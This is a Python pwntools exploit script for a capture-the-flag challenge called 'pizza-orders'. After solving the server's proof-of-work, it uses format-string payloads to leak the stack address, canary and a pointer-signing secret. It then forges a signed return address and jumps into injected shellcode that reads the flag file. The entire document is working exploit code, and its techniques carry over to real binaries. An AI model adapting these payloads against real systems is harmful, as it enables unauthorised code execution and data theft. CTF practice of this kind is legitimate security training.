import hashlib
import string

from pwn import *

exe = ELF("./chall")

context.binary = exe

HOST = "pizza-orders.challs.olicyber.it"
PORT = 16008

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
# args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

# from template.py
def num_to_charseq(num, charset=string.ascii_letters):
    res = ""
    while True:
        if num < len(charset):
            res += charset[num]
            break
        res += charset[num % len(charset)]
        num //= len(charset)
    return res

def solve_pow(init_str, end_hash):
    num = 0
    while True:
        try_solve = init_str + num_to_charseq(num)
        if hashlib.sha256(try_solve.encode("ascii")).hexdigest().lower().endswith(end_hash.lower()):
            return try_solve
        num += 1

def start_solver(r):
    r.recvuntil(b"Give me a string")
    proc = log.progress("PoW Required, solving...")
    r.recvuntil(b"starting in ")
    init_string = r.recvuntil(b" ")[:-1]
    r.recvuntil(b"ends in ")
    hash_end = r.recvuntil(b".")[:-1]
    r.sendline(solve_pow(init_string.decode(), hash_end.decode()).encode())
    proc.success("PoW Solved, Starting Exploit")

# end template.py

def send_chunks(payload):
    for i in range(0, len(payload), 2):
        r.real_send_raw(payload[i : min(i + 2, len(payload))])
        sleep(0.05)

def menu(r, idx):
    r.recvuntil(b"-1")
    r.sendlineafter(b"> ", str(idx).encode())
    
def new_order(r, title, desc):
    menu(r, 1)
    r.sendlineafter(b"> ", title)
    r.sendlineafter(b"> ", desc)

def edit_order(r, idx, title, desc):
    menu(r, 2)
    r.sendlineafter(b"> ", str(idx).encode())
    if idx <= 0:
        r.sendlineafter(b"again", b"-1")
        
    r.sendlineafter(b"> ", title)
    r.sendlineafter(b"> ", desc)

def remove_order(r, idx):
    menu(r, 3)
    r.sendlineafter(b"> ", str(idx).encode())
    
def show_advanced(r, idx):
    menu(r, 4)
    r.sendlineafter(b"> ", str(idx).encode())

def delete_last(r):
    menu(r, 7)

def set_last(r, idx):
    menu(r, 2)
    r.sendlineafter(b"> ", str(idx).encode())
    if idx <= 0:
        r.sendlineafter(b"again", b"-1")
    
def send_shellcode(r):  
    shell = asm(
        shellcraft.amd64.linux.cat2("./pizza_secret_recipe") +
        shellcraft.amd64.linux.exit(0)
    )
    
    menu(r, 2)
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"> ", b"sinner")
    r.sendlineafter(b"> ", shell)
    
def enter_priviledged_mode(r):
    set_last(r, 0)
    delete_last(r)
    
def leak_stack(leaks):
    global STACK
    STACK = int(leaks[1][2:], 16)
    log.success(f"LEAKED STACK: {hex(STACK)}")

def leak_canary(leaks):
    global CANARY
    CANARY = int(leaks[2][2:], 16)
    log.success(f"LEAKED CANARY: {hex(CANARY)}")

def leaks(r):
    new_order(r, b"tennis", b"%p %15$p %13$p")
    show_advanced(r, 1)

    r.recvuntil(b"details: ")
    for i in range(2): r.recvline()

    leaks = r.recvline().decode().split()
    
    leak_stack(leaks)
    leak_canary(leaks)
    
def leak_shellcode_pos(r):
    show_advanced(r, 2)
    
    r.recvuntil(b"details: ")
    global SHELLCODE
    SHELLCODE = int(r.recvline()[2:], 16)
    log.success(f"LEAKED SHELLCODE: {hex(SHELLCODE)}")
    
def leak_secret(r):
    edit_order(r, 1, b"tennis", b"%20$p %21$p")
    show_advanced(r, 1)

    r.recvuntil(b"details: ")
    for _ in range(2):
        r.recvline()
    
    leaks = r.recvline().decode().split()
    rbp = int(leaks[0][2:], 16)
    ret = int(leaks[1][2:], 16)
    
    global SECRET
    SECRET = ret >> 48

    ret &= 0xffffffffffff

    for b in list(pack(ret)) + list(pack(rbp)):
        SECRET ^= (b << 8) ^ b

    log.success(f"LEAKED SECRET: {hex(SECRET)}")

def sign_addr(addr, sec):
    for b in list(pack(addr)) + [0x41 for _ in range(8)]:
        sec ^= (b << 8) ^ b

    addr |= sec << 48
    return b"A" * 8 + pack(addr)

def ret2shellcode(r):
    menu(r, 2)
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"> ", b"sinner")

    r.recvuntil(b"> ")
    for _ in range(4):
        r.send(b"A" * 50)
        
    payload = pack(CANARY) + sign_addr(SHELLCODE + 20, SECRET)
    r.sendline(payload)
    
def main(r):
    r.real_send_raw = r.send_raw
    r.send_raw = send_chunks
    
    send_shellcode(r)
    enter_priviledged_mode(r)

    leaks(r)
    leak_shellcode_pos(r)

    leak_secret(r)
    ret2shellcode(r)
    
    r.interactive()
    
if __name__ == "__main__":
    r = conn()

    if args.LOCAL:
        main(r)
    else:
        start_solver(r)
        main(r)
